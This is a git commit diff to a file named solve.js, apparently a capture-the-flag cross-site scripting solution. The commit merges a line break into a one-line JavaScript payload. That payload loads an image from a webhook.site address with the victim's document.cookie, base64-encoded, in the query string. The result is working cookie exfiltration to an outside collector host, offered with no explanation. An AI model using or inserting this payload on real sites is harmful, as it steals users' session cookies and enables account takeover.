a5cfdce3583634bbff08f6bc12a3102ec8d31daf
LanceloT <94410620+LaceloTT@users.noreply.github.com>
2024-11-22 10:21:28 -0300

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/d8a3f99c-2098-43dd-815d-4261b61a39b5?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/d8a3f99c-2098-43dd-815d-4261b61a39b5?data='+btoa(document.cookie);
